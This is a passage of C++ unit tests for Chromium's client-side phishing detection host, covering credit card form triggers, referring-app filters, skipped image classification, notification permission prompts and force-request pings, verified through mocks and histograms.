  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  EXPECT_FALSE(future.IsReady());

  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 2);
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormDedupedEvent",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);

  // Note also that HistoryService was not called a second time either.
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.HistoryServiceDuration.GetDailyVisitsToOrigin", 1);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       InteractionTriggerDisabledDoesNotTrigger) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormSampleRate.name, "1.0"},
       {kCsdCreditCardFormEnableInteractionTrigger.name, "false"}});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/false);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());

  OnCreditCardFormVisitCountForTesting(
      /*start_time=*/std::nullopt, credit_card_form::kAutofillServer,
      "OnAfterFocusOnFormField", /*should_trigger=*/false,
      history::DailyVisitsResult{/*success=*/true, /*count=*/1,
                                 /*count_404s=*/0});

  base::RunLoop().RunUntilIdle();

  EXPECT_FALSE(future.IsReady());
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       DetectionTriggerTriggersOnFieldTypesDetermined) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormSampleRate.name, "1.0"},
       {kCsdCreditCardFormEnableDetectionTrigger.name, "true"}});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/false);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  csd_host_->RegisterAutofillManager();

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);

  // Trigger OnFieldTypesDetermined instead of focus.
  autofill_manager()->NotifyObservers(
      &autofill::AutofillManager::Observer::OnFieldTypesDetermined,
      form_data.global_id(),
      autofill::AutofillManager::Observer::FieldTypeSource::kAutofillServer,
      /*small_forms_were_parsed=*/false);

  WaitUntilHighConfidenceAllowlistCheckDone();
  WaitAndCheckPreClassificationChecks();

  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm",
      PreClassificationCheckResult::CLASSIFY, 1);
}

TEST_F(ClientSideDetectionHostCreditCardFormTest,
       DetectionAndInteractionTriggersOnlyTriggerOnce) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {{kCsdCreditCardFormSampleRate.name, "1.0"},
       {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
       {kCsdCreditCardFormEnableDetectionTrigger.name, "true"}});
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/false);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  csd_host_->RegisterAutofillManager();

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);

  // 1. Detection trigger.
  autofill_manager()->NotifyObservers(
      &autofill::AutofillManager::Observer::OnFieldTypesDetermined,
      form_data.global_id(),
      autofill::AutofillManager::Observer::FieldTypeSource::kAutofillServer,
      /*small_forms_were_parsed=*/false);

  WaitUntilHighConfidenceAllowlistCheckDone();
  WaitAndCheckPreClassificationChecks();

  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3.OnFieldTypesDetermined",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.PreClassificationCheckResult.CreditCardForm",
      PreClassificationCheckResult::CLASSIFY, 1);

  // 2. Interaction trigger (should be deduped).
  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());

  EXPECT_FALSE(future.IsReady());

  // Event logged again, but deduped event only once.
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 2);
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3.OnFieldTypesDetermined",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormEvent3.OnAfterFocusOnFormField",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormDedupedEvent",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
  ExpectOnlyBucketCount(
      "SBClientPhishing.CreditCardFormDedupedEvent.OnFieldTypesDetermined",
      credit_card_form::kNewSiteVisitNoReferringAppAutofillServerHeuristic, 1);
}

struct CreditCardFormReferringAppTestCase {
  std::string referring_app_name;
  credit_card_form::ReferringApp expected_referring_app;
  bool should_pass_filter;

  static std::string GetTestName(
      const testing::TestParamInfo<CreditCardFormReferringAppTestCase>&
          test_case) {
    std::string app_name;
    base::ReplaceChars(test_case.param.referring_app_name, ".", "_", &app_name);
    return base::StrCat({
        app_name,
        "_",
        ToString(test_case.param.expected_referring_app),
    });
  }
};

class ClientSideDetectionHostCreditCardFormReferringAppTest
    : public ClientSideDetectionHostCreditCardFormTest,
      public testing::WithParamInterface<CreditCardFormReferringAppTestCase> {
 public:
  void SetUp() override {
    ClientSideDetectionHostCreditCardFormTest::SetUp();

#if BUILDFLAG(IS_ANDROID)
    const CreditCardFormReferringAppTestCase& test_case = GetParam();
    raw_delegate_->SetReferringAppName(test_case.referring_app_name);
#endif
  }
};

const CreditCardFormReferringAppTestCase
    credit_card_form_referring_app_test_cases[] = {
        {"", credit_card_form::kNoReferringApp, false},
#if BUILDFLAG(IS_ANDROID)
        {"chrome", credit_card_form::kChrome, false},
        {"android.messages", credit_card_form::kSmsApp, true},
        {"com.samsung.android.messaging", credit_card_form::kSmsApp, true},
        {"com.foo", credit_card_form::kOtherApp, false},
#else
        {"chrome", credit_card_form::kNoReferringApp, false},
        {"android.messages", credit_card_form::kNoReferringApp, false},
        {"com.samsung.android.messaging", credit_card_form::kNoReferringApp,
         false},
        {"com.foo", credit_card_form::kNoReferringApp, false},
#endif
};

INSTANTIATE_TEST_SUITE_P(
    All,
    ClientSideDetectionHostCreditCardFormReferringAppTest,
    testing::ValuesIn(credit_card_form_referring_app_test_cases),
    CreditCardFormReferringAppTestCase::GetTestName);

TEST_P(ClientSideDetectionHostCreditCardFormReferringAppTest,
       ProceedsToClassification) {
  const CreditCardFormReferringAppTestCase& test_case = GetParam();

  if (!test_case.should_pass_filter) {
    // Note that on builds that use DBus, TearDown after GTEST_SKIP may crash in
    // a way that does not register as a build failure. See b/490133826 and
    // b/462607324 tracking the root cause.
    GTEST_SKIP();
  }

  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {
          {kCsdCreditCardFormHCAcceptanceRate.name, "0.0"},
          {kCsdCreditCardFormSampleRate.name, "1.0"},
          {kCsdCreditCardFormEnableReferringAppFilter.name, "true"},
          {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
      });
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  NavigateAndWaitOnPreclassificationChecks(url);

  auto form_data = CreateCreditCardForm();

  // Check that histograms haven't been recorded yet.
  histogram_tester.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3", 0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.CreditCardForm", 0);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchCSDAllowlistOnCreditCardForm", 0);

  csd_host_->RegisterAutofillManager();

  ExpectPreClassificationChecks(url, &kFalse, &kFalse, nullptr, nullptr);
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  WaitUntilHighConfidenceAllowlistCheckDone();
  WaitAndCheckPreClassificationChecks();

  // Credit card form event should be logged with correct referring app.
  credit_card_form::CreditCardFormEvent expected_event =
      credit_card_form::GetCreditCardFormEvent(
          credit_card_form::kNewSiteVisit, test_case.expected_referring_app,
          credit_card_form::kAutofillServer);
  histogram_tester.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3", 1);
  histogram_tester.ExpectBucketCount("SBClientPhishing.CreditCardFormEvent3",
                                     expected_event, 1);

  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.CreditCardForm", 1);
  ExpectOnlyBucketCount("SBClientPhishing.MatchCSDAllowlistOnCreditCardForm",
                        false, 1);
}

TEST_P(ClientSideDetectionHostCreditCardFormReferringAppTest,
       DoesNotStartPreclassificationBecauseOfReferringAppFilter) {
  const CreditCardFormReferringAppTestCase& test_case = GetParam();

  if (test_case.should_pass_filter) {
    // Note that on builds that use DBus, TearDown after GTEST_SKIP may crash in
    // a way that does not register as a build failure. See b/490133826 and
    // b/462607324 tracking the root cause.
    GTEST_SKIP();
  }

  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionCreditCardForm,
      {
          {kCsdCreditCardFormHCAcceptanceRate.name, "0.0"},
          {kCsdCreditCardFormSampleRate.name, "1.0"},
          {kCsdCreditCardFormEnableReferringAppFilter.name, "true"},
          {kCsdCreditCardFormEnableInteractionTrigger.name, "true"},
      });
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  base::HistogramTester histogram_tester;

  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, /*match=*/true);
  NavigateAndWaitOnPreclassificationChecks(url);

  // Check that histograms haven't been recorded yet.
  histogram_tester.ExpectTotalCount("SBClientPhishing.CreditCardFormEvent3", 0);

  csd_host_->RegisterAutofillManager();
  auto form_data = CreateCreditCardForm();

  TestFuture<ClientSideDetectionType> future;
  csd_host_->set_preclassification_started_callback_for_testing(
      future.GetRepeatingCallback());

  base::StatisticsRecorder::HistogramWaiter event_waiter(
      "SBClientPhishing.CreditCardFormEvent3");
  autofill_manager()->OnFocusOnFormField(
      form_data, form_data.fields().begin()->global_id());
  event_waiter.Wait();

  // The Autofill field detection event should not have resulted in
  // triggering preclassification.
  EXPECT_FALSE(future.IsReady());

  credit_card_form::CreditCardFormEvent expected_event =
      credit_card_form::GetCreditCardFormEvent(
          credit_card_form::kNewSiteVisit, test_case.expected_referring_app,
          credit_card_form::kAutofillServer);
  ExpectOnlyBucketCount("SBClientPhishing.CreditCardFormEvent3", expected_event,
                        1);
}

class ClientSideDetectionHostSkipImageClassificationScoringTest
    : public ClientSideDetectionHostTest,
      public testing::WithParamInterface<ClientSideDetectionType> {
 public:
  void SetUp() override { ClientSideDetectionHostTest::SetUp(); }

  ClientSideDetectionType GetParamType() const {
    return static_cast<ClientSideDetectionType>(GetParam());
  }

  static std::string GetTestName(
      const testing::TestParamInfo<ClientSideDetectionType>& test_case) {
    return GetRequestTypeName(test_case.param);
  }

  static std::vector<ClientSideDetectionType> GetAllParamValues() {
    std::vector<ClientSideDetectionType> values;
    for (int i = 0; ClientSideDetectionType_IsValid(i); i++) {
      ClientSideDetectionType type = static_cast<ClientSideDetectionType>(i);
      if (type !=
          ClientSideDetectionType::CLIENT_SIDE_DETECTION_TYPE_UNSPECIFIED) {
        values.push_back(type);
      }
    }
    return values;
  }
};

INSTANTIATE_TEST_SUITE_P(
    All,
    ClientSideDetectionHostSkipImageClassificationScoringTest,
    ::testing::ValuesIn(
        ClientSideDetectionHostSkipImageClassificationScoringTest::
            GetAllParamValues()),
    ClientSideDetectionHostSkipImageClassificationScoringTest::GetTestName);

TEST_P(ClientSideDetectionHostSkipImageClassificationScoringTest,
       NeverSkipWhenFeatureDisabled) {
  const ClientSideDetectionType& request_type = GetParamType();
  base::HistogramTester histogram_tester;

  feature_list_.InitAndDisableFeature(
      kSkipImageClassificationScoringForNonPageLoadTriggers);
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .WillOnce([](SafeBrowsingTokenFetcher::Callback cb) {
        std::move(cb).Run("fake_access_token");
      });

  base::RunLoop run_loop;
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
      .WillOnce(testing::InvokeWithoutArgs(&run_loop, &base::RunLoop::Quit));

  csd_host_->OnPhishingPreClassificationDone(
      request_type, /*should_classify=*/true, /*is_sample_ping=*/true,
      /*did_match_high_confidence_allowlist=*/false, /*is_invalid_ip=*/false);

  // Wait for the report to be sent.
  run_loop.Run();

  // Phishing detection should have been done (not skipped).
  EXPECT_TRUE(fake_phishing_detector_.phishing_detection_started());

  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult." +
          GetRequestTypeName(request_type),
      mojom::PhishingDetectorResult::SUCCESS, 1);
}

TEST_P(ClientSideDetectionHostSkipImageClassificationScoringTest,
       TriggerModelsDoesNotSkipWhenFeatureIsEnabled) {
  const ClientSideDetectionType& request_type = GetParamType();
  base::HistogramTester histogram_tester;

  if (request_type != ClientSideDetectionType::TRIGGER_MODELS) {
    // Note that on builds that use DBus, TearDown after GTEST_SKIP may crash in
    // a way that does not register as a build failure. See b/490133826 and
    // b/462607324 tracking the root cause.
    GTEST_SKIP();
  }

  feature_list_.InitAndEnableFeature(
      kSkipImageClassificationScoringForNonPageLoadTriggers);
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .WillOnce([](SafeBrowsingTokenFetcher::Callback cb) {
        std::move(cb).Run("fake_access_token");
      });

  base::RunLoop run_loop;
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
      .WillOnce(testing::InvokeWithoutArgs(&run_loop, &base::RunLoop::Quit));

  csd_host_->OnPhishingPreClassificationDone(
      request_type, /*should_classify=*/true, /*is_sample_ping=*/true,
      /*did_match_high_confidence_allowlist=*/false, /*is_invalid_ip=*/false);

  // Wait for the report to be sent.
  run_loop.Run();

  // Phishing detection should have been done (not skipped).
  EXPECT_TRUE(fake_phishing_detector_.phishing_detection_started());

  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult." +
          GetRequestTypeName(request_type),
      mojom::PhishingDetectorResult::SUCCESS, 1);
}

TEST_P(ClientSideDetectionHostSkipImageClassificationScoringTest,
       AllOtherTypesSkipWhenFeatureIsEnabled) {
  const ClientSideDetectionType& request_type = GetParamType();
  base::HistogramTester histogram_tester;

  if (request_type == ClientSideDetectionType::TRIGGER_MODELS) {
    // Note that on builds that use DBus, TearDown after GTEST_SKIP may crash in
    // a way that does not register as a build failure. See b/490133826 and
    // b/462607324 tracking the root cause.
    GTEST_SKIP();
  }

  feature_list_.InitAndEnableFeature(
      kSkipImageClassificationScoringForNonPageLoadTriggers);
  SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

  EXPECT_CALL(*raw_token_fetcher_, Start(_))
      .WillOnce([](SafeBrowsingTokenFetcher::Callback cb) {
        std::move(cb).Run("fake_access_token");
      });

  base::RunLoop run_loop;
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
      .WillOnce(testing::InvokeWithoutArgs(&run_loop, &base::RunLoop::Quit));

  csd_host_->OnPhishingPreClassificationDone(
      request_type, /*should_classify=*/true, /*is_sample_ping=*/true,
      /*did_match_high_confidence_allowlist=*/false, /*is_invalid_ip=*/false);

  // Wait for the report to be sent.
  run_loop.Run();

  // Phishing detection should have been skipped.
  EXPECT_FALSE(fake_phishing_detector_.phishing_detection_started());

  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.PhishingDetectorResult." +
          GetRequestTypeName(request_type),
      mojom::PhishingDetectorResult::CLASSIFICATION_SKIPPED, 1);
}

class ClientSideDetectionHostNotificationTest
    : public ClientSideDetectionHostTest {
 public:
  ClientSideDetectionHostNotificationTest() = default;

  void SetUp() override {
    ClientSideDetectionHostTest::SetUp();

    SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);

    permissions::PermissionRequestManager::CreateForWebContents(web_contents());
    auto* manager =
        permissions::PermissionRequestManager::FromWebContents(web_contents());
    manager->set_enabled_app_level_notification_permission_for_testing(true);
    prompt_factory_ =
        std::make_unique<permissions::MockPermissionPromptFactory>(manager);

    // Set the prefs and feature and then register the request manager because
    // this is set up on tab start, but the prefs were not set when the test is
    // created.
    csd_host_->RegisterPermissionRequestManager();
    manager->clear_permission_ui_selector_for_testing();
  }

  void TearDown() override {
    if (!setup_called_) {
      return;
    }
    prompt_factory_.reset();
    ClientSideDetectionHostTest::TearDown();
  }

  void PhishingDetectionDone(mojo_base::ProtoWrapper verdict) {
    csd_host_->PhishingDetectionDone(
        ClientSideDetectionType::NOTIFICATION_PERMISSION_PROMPT,
        /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/false,
        /*is_invalid_ip=*/false, clock_.NowTicks(),
        mojom::PhishingDetectorResult::SUCCESS, std::move(verdict));
  }

  void PhishingDetectionError(mojom::PhishingDetectorResult error) {
    csd_host_->PhishingDetectionDone(
        ClientSideDetectionType::NOTIFICATION_PERMISSION_PROMPT,
        /*is_sample_ping=*/false, /*did_match_high_confidence_allowlist=*/false,
        /*is_invalid_ip=*/false, clock_.NowTicks(), error, std::nullopt);
  }

  void WaitForBubbleToBeShown() {
    auto* manager =
        permissions::PermissionRequestManager::FromWebContents(web_contents());
    manager->DocumentOnLoadCompletedInPrimaryMainFrame();
    task_environment()->RunUntilIdle();
  }

 protected:
  std::unique_ptr<permissions::MockPermissionPromptFactory> prompt_factory_;
};

TEST_F(ClientSideDetectionHostNotificationTest,
       NotificationPermissionPromptTriggersClassificationRequest) {
  base::HistogramTester histogram_tester;

  // First navigate to a page, which should trigger preclassification check.
  GURL url("http://example.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);
  ExpectPreClassificationChecks(url, /*is_private=*/&kFalse,
                                /*match_csd_allowlist=*/&kFalse,
                                /*get_valid_cached_result=*/&kFalse,
                                /*over_phishing_report_limit=*/&kFalse);
  NavigateAndCommit(url);
  WaitAndCheckPreClassificationChecks();

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::TRIGGER_MODELS, 1);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 1);

  // Second, create a permission request that's specifically notifications, and
  // add to the request manager, which should also trigger a preclassification
  // check, this will skip the expect call for GetValidCachedResult. In
  // addition, we do not check the cache if the request type was not through
  // trigger model.
  ExpectPreClassificationChecks(url, /*is_private=*/&kFalse,
                                /*match_csd_allowlist=*/&kFalse,
                                /*get_valid_cached_result=*/nullptr,
                                /*over_phishing_report_limit=*/&kFalse);

  ClientPhishingRequest verdict;
  verdict.set_client_score(0.8f);

  EXPECT_CALL(*csd_service_,
              SendClientReportPhishingRequest(
                  PartiallyEqualVerdict(verdict), _,
                  "fake_access_token_notification_permission_prompt"));

  // Set up mock call to token fetcher.
  SafeBrowsingTokenFetcher::Callback cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_)).WillOnce(MoveArg<0>(&cb));
  permissions::MockPermissionRequest::MockPermissionRequestState request_state;
  auto request1 = std::make_unique<permissions::MockPermissionRequest>(
      url, permissions::RequestType::kNotifications,
      permissions::PermissionRequestGestureType::GESTURE,
      request_state.GetWeakPtr());
  auto* manager =
      permissions::PermissionRequestManager::FromWebContents(web_contents());
  manager->AddRequest(web_contents()->GetPrimaryMainFrame(),
                      std::move(request1));

  WaitForBubbleToBeShown();

  EXPECT_TRUE(prompt_factory_->is_visible());
  EXPECT_TRUE(prompt_factory_->RequestTypeSeen(request_state.request_type));
  ASSERT_EQ(prompt_factory_->request_count(), 1);

  // Wait for token fetcher to be called.
  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run("fake_access_token_notification_permission_prompt");

  manager->Accept(/*prompt_options=*/std::monostate());
  task_environment()->RunUntilIdle();

  EXPECT_TRUE(request_state.granted);

  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.PhishingDetectorResult.NotificationPermissionPrompt",
      1);
  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::NOTIFICATION_PERMISSION_PROMPT, 1);
  // Below histogram checks that there has been two classification requests.
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest", 2);
}

TEST_F(ClientSideDetectionHostNotificationTest,
       NotPhishingVerdictSendsPingFromNotificationPermissionPrompt) {
  base::HistogramTester histogram_tester;

  ClientPhishingRequest verdict;
  verdict.set_url("http://example.com/");
  verdict.set_client_score(0.8f);
  verdict.set_is_phishing(false);
  verdict.set_client_side_detection_type(
      ClientSideDetectionType::NOTIFICATION_PERMISSION_PROMPT);

  EXPECT_CALL(*csd_service_,
              SendClientReportPhishingRequest(
                  PartiallyEqualVerdict(verdict), _,
                  "fake_access_token_notification_permission_prompt"));

  // Set up mock call to token fetcher.
  SafeBrowsingTokenFetcher::Callback cb;
  EXPECT_CALL(*raw_token_fetcher_, Start(_)).WillOnce(MoveArg<0>(&cb));

  // Make the call.
  PhishingDetectionDone(mojo_base::ProtoWrapper(verdict));

  // Wait for token fetcher to be called.
  EXPECT_TRUE(Mock::VerifyAndClear(raw_token_fetcher_));

  ASSERT_FALSE(cb.is_null());
  std::move(cb).Run("fake_access_token_notification_permission_prompt");

  histogram_tester.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::NOTIFICATION_PERMISSION_PROMPT, 1);
}

class ClientSideDetectionRTLookupResponseForceRequestTest
    : public ClientSideDetectionHostTest {
 public:
  ClientSideDetectionRTLookupResponseForceRequestTest() = default;

  void SetUp() override {
    ClientSideDetectionHostTest::SetUp();
    SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
    database_manager_->SetAllowlistLookupDetailsForUrl(example_url_, false);
    ON_CALL(*raw_token_fetcher_, Start(_))
        .WillByDefault([&](SafeBrowsingTokenFetcher::Callback callback) {
          std::move(callback).Run("fake_access_token");
        });

    AsyncCheckTracker::CreateForWebContents(
        web_contents(),
        /*ui_manager=*/nullptr,
        /*should_sync_checker_check_allowlist=*/false);
    csd_host_->RegisterAsyncCheckTracker();
  }

 protected:
  void SetRTResponseInCacheManager(bool is_enforced) {
    VerdictCacheManager* cache_manager =
        VerdictCacheManagerFactory::GetForProfile(
            Profile::FromBrowserContext(web_contents()->GetBrowserContext()));
    RTLookupResponse response;
    RTLookupResponse::ThreatInfo* new_threat_info = response.add_threat_info();
    new_threat_info->set_verdict_type(RTLookupResponse::ThreatInfo::DANGEROUS);
    new_threat_info->set_threat_type(
        RTLookupResponse::ThreatInfo::SOCIAL_ENGINEERING);
    new_threat_info->set_cache_duration_sec(60);
    new_threat_info->set_cache_expression_using_match_type(
        "suspiciousurl.com/");
    new_threat_info->set_cache_expression_match_type(
        RTLookupResponse::ThreatInfo::EXACT_MATCH);

    response.set_client_side_detection_type(
        is_enforced ? safe_browsing::ClientSideDetectionType::FORCE_REQUEST
                    : safe_browsing::ClientSideDetectionType::
                          CLIENT_SIDE_DETECTION_TYPE_UNSPECIFIED);
    cache_manager->CacheRealTimeUrlVerdict(response, base::Time::Now());
  }

  void CompleteAsyncCheck() {
    auto* tracker = AsyncCheckTracker::GetOrCreateForWebContents(
        web_contents(), /*ui_manager=*/nullptr,
        /*should_sync_checker_check_allowlist=*/false);
    auto checker = std::make_unique<UrlCheckerHolder>(
        /*delegate_getter=*/base::NullCallback(), content::FrameTreeNodeId(),
        /*navigation_id=*/0,
        /*web_contents_getter=*/base::NullCallback(),
        /*complete_callback=*/base::NullCallback(),
        /*url_real_time_lookup_enabled=*/false,
        /*can_check_db=*/true,
        /*can_check_high_confidence_allowlist=*/true,
        /*url_lookup_service_metric_suffix=*/"",
        /*url_lookup_service=*/nullptr,
        /*hash_realtime_service=*/nullptr,
        /*hash_realtime_selection=*/
        hash_realtime_utils::HashRealTimeSelection::kNone,
        /*is_async_check=*/true, /*check_allowlist_before_hash_database=*/false,
        SessionID::InvalidValue(), /*referring_app_info=*/std::nullopt);
    tracker->TransferUrlChecker(std::move(checker));
    // all_checks_completed must be set to true to notify
    // ClientSideDetectionHost.
    UrlCheckerHolder::OnCompleteCheckResult result(
        /*proceed=*/true, /*showed_interstitial=*/false,
        /*has_post_commit_interstitial_skipped=*/false,
        SafeBrowsingUrlCheckerImpl::PerformedCheck::kUrlRealTimeCheck,
        /*all_checks_completed=*/true);
    tracker->PendingCheckerCompleted(/*navigation_id=*/0, result);
  }

  base::HistogramTester histogram_tester_;
  GURL example_url_{"http://suspiciousurl.com/"};
};

TEST_F(ClientSideDetectionRTLookupResponseForceRequestTest,
       AsyncCheckTrackerTriggersClassificationRequest) {
  NavigateAndCommit(example_url_);
  // Force request should not be triggered, because RTLookupResponse hasn't
  // been cached.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 0);

  SetRTResponseInCacheManager(/*is_enforced=*/true);

  // We will send a ping because the async check has completed and forced
  // request is set.
  base::RunLoop run_loop;
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
      .Times(1)
      .WillOnce(
          [&](std::unique_ptr<ClientPhishingRequest>,
              ClientSideDetectionService::ClientReportPhishingRequestCallback,
              const std::string&) { run_loop.Quit(); });
  // This call should trigger preclassification check again.
  CompleteAsyncCheck();
  run_loop.Run();

  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 1);
  histogram_tester_.ExpectUniqueSample(
      "SBClientPhishing.ClientSideDetection."
      "AsyncCheckTriggerForceRequestResult",
      ClientSideDetectionHost::AsyncCheckTriggerForceRequestResult::kTriggered,
      1);
}

TEST_F(ClientSideDetectionRTLookupResponseForceRequestTest,
       AsyncCheckTrackerTriggersClassificationRequestOnAllowlistMatch) {
  NavigateAndCommit(example_url_);
  // Force request should not be triggered, because RTLookupResponse hasn't
  // been cached.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 0);

  SetRTResponseInCacheManager(/*is_enforced=*/true);

  // Generally, this never happens unless a sampled RTLookupResponse contains
  // the suspicious URL. For the purpose of this test, we will set that there's
  // a match.
  SetHighConfidenceAllowlistAcceptanceRate(1.0f);
  database_manager_->SetAllowlistLookupDetailsForUrl(example_url_, true);

  // We will send a ping because the async check has completed and forced
  // request is set.
  base::RunLoop run_loop;
  EXPECT_CALL(*csd_service_, SendClientReportPhishingRequest(_, _, _))
      .Times(1)
      .WillOnce(
          [&](std::unique_ptr<ClientPhishingRequest>,
              ClientSideDetectionService::ClientReportPhishingRequestCallback,
              const std::string&) { run_loop.Quit(); });
  // This call should trigger preclassification check again.
  CompleteAsyncCheck();
  run_loop.Run();

  EXPECT_TRUE(Mock::VerifyAndClear(csd_service_.get()));
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 1);
  histogram_tester_.ExpectUniqueSample(
      "SBClientPhishing.ClientSideDetection."
      "AsyncCheckTriggerForceRequestResult",
      ClientSideDetectionHost::AsyncCheckTriggerForceRequestResult::kTriggered,
      1);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.MatchHighConfidenceAllowlist.ForceRequest", 1);
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.PreClassificationCheckResult",
      PreClassificationCheckResult::NO_CLASSIFY_MATCH_HC_ALLOWLIST, 0);
}

TEST_F(ClientSideDetectionRTLookupResponseForceRequestTest,
       AsyncCheckTrackerNotTriggerClassificationRequestNoEnforcedPing) {
  NavigateAndCommit(example_url_);

  SetRTResponseInCacheManager(/*is_enforced=*/false);

  CompleteAsyncCheck();
  task_environment()->RunUntilIdle();

  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.ClientSideDetectionTypeRequest",
      ClientSideDetectionType::FORCE_REQUEST, 0);
  histogram_tester_.ExpectUniqueSample(
      "SBClientPhishing.ClientSideDetection."
